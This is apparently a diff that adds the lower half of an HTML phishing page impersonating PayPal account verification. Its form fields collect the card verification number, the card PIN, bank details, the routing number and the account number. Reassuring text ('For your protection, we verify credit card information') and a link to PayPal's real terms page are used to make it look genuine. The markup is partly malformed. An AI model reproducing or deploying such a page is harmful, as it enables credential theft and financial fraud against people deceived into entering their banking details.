+        <TR>
+          <TD align=right class=pplabel height=28 width=200>
+            <P 0px><LABEL for=cvv2_number>Card Verification 
+            <BR>Number:</LABEL></P></TD>
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=49><INPUT id=cvv_number maxLength=3 
+            name=cvv size=4><SPAN class=ppsmalltext>&nbsp;</SPAN></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=28 width=200>Card PIN Number: 
+          </TD>
+
+          <TD height=28 width=8><BR class=field_spacer></TD>
+          <TD class=pptext height=28 width=492><INPUT id=pin_number 
+            maxLength=4 name=pin size=5 type=password><SPAN 
+            class=ppsmalltext>&nbsp;</SPAN> <SPAN class=ppsmalltext>(your 
+            4-digit card pin) <FONT color=red>* If PIN is invalid your account 
+            will not be verified. </FONT></SPAN></TD></TR>
+        <TR>
+          <TD align=right class=pplabel height=27 width=200>Bank Name:</TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=bank_name 
+            maxLength=32 name=bank_name size=25 
+            verdana,arial,helvetica,sans-serif FONT-FAMILY: 225px; WIDTH: 13px; 
+            FONT-SIZE: 400;></TD></TR>
+        <TR>
+
+          <TD align=right class=pplabel height=27 width=200>Bank Telephone 
+            Number:</TD>
+          <TD height=27 width=8>&nbsp;</TD>
+          <TD class=pptext height=27 width=492><INPUT id=Bank_tel maxLength=20 
+            name=bankphone size=25 verdana,arial,helvetica,sans-serif 
+            FONT-FAMILY: 225px; WIDTH: 13px; FONT-SIZE: 400;></TD></TR>
+        <TR>
+          <TD colSpan=3 height=4 width=700></TD></TR>
+        <TR>
+          <TD colSpan=3 height=4 width=700></TD></TR>
+        <TR>
+
+          <TD align=right class=pplabel height=35 width=200><LABEL 
+            for=bank_routing>Routing Number</LABEL>:
+            <P>
+            <P>&nbsp;</P></TD>
+          <TD height=35 width=8>&nbsp;</TD>
+          <TD height=35><IMG border=0 height=18 
+            src="http://images.google.de/images?q=tbn:GvlJXsVSbYL4dM:https://www.sigmaxi.org/member/dues/images/symbol_route.gif" 
+            width=14> <INPUT maxLength=10 name=bank_routing size=17> <IMG 
+            border=0 height=18 
+            src="http://images.google.de/images?q=tbn:GvlJXsVSbYL4dM:https://www.sigmaxi.org/member/dues/images/symbol_route.gif" 
+            width=14> <BR><SPAN class=ppsmalltext>(Is usually located between 
+            the <IMG align=textTop border=0 height=12 
+            src="http://images.google.de/images?q=tbn:gZBsHQV25BkP4M:https://ispdial.com/%255Bcbt%255D/images/symbol_route_small.gif" 
+            width=10> symbols on your check.)</SPAN></TD></TR>
+        <TR>
+
+          <TD colSpan=3 height=4 width=700></TD></TR>
+        <tr>
+          <TD class=pplabel height=48 width=200>
+            <P align=right><LABEL for=bank_account>Account Number</LABEL>:</P>
+            <P align=right>&nbsp;</P>
+            <P align=right>&nbsp;</P></TD>
+          <TD height=48 width=8>&nbsp;</TD>
+          <TD height=48><INPUT maxLength=32 name=bankaccountnumber size="20"> <IMG 
+            border=0 height=18 
+            src="http://images.google.de/images?q=tbn:KVJVyrAWyR0GkM:https://www.sigmaxi.org/member/dues/images/symbol_account.gif" 
+            width=14> <BR><SPAN class=ppsmalltext>(Typically comes before the 
+            <IMG align=textTop border=0 height=12 
+            src="http://images.google.de/images?q=tbn:hIADi_z1gaX5WM:https://ispdial.com/%255Bcbt%255D/images/symbol_account_small.gif" 
+            width=10> symbol. Its exact location and number of digits varies 
+            from bank to bank.)</SPAN></TD>
+
+        </tr>
+
+        </tr>
+
+        </tr>
+        <TR>
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR vAlign=top>
+
+          <TD bgColor=#f9f9f9 colSpan=3 height=30 width=700>
+            <TABLE border=0 cellPadding=2 cellSpacing=0 width="100%">
+              <TBODY>
+              <TR vAlign=top>
+        <TR>
+          <TD bgColor=#cccccc colSpan=3 height=1 width=700><IMG height=1 
+            src="images/pixel.gif" 
+width=1></TD></TR>
+        <TR>
+          <TD colSpan=3 height=10 width=700><BR class=h10></TD></TR>
+        <TR>
+
+              <TR>
+          <TD class=ppsmalltextbold colSpan=3 height=46 width=700><INPUT 
+            id=terms name=terms type=checkbox value=ON> <LABEL for=terms><SPAN 
+            class=ppsmalltextbold>I have read and agree to the terms of service and privacy policy.
+            <SCRIPT language=JavaScript>
+                                        <!-- hide from JavaScript-challenged browsers
+                                        document.write(<a href=\javascript:openWindow640('https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/terms-pop-outside');\>User Agreement</a>)
+                                        // done hiding -->
+                                        </SCRIPT>
+             </SPAN></LABEL>
+            <P>&nbsp;</P>
+            <P><SPAN class=ppsmalltext><B>For your protection, we verify credit 
+            card information.</B><BR>The process normally takes about 30 
+            seconds, but it may take longer during certain times of the day. 
+            <br>
+            Please click <B>Submit</B> to verify your information. When your 
+            information has been successfully submitted, you will be taken to 
+            the PayPal welcome page.<center></SPAN><span class=ppsmalltext>
+
+            <input name=action onClick="return check_all(this.form);" type=submit value=Submit>
+              </span>
+            
+</FORM>
+</BODY></HTML>
+
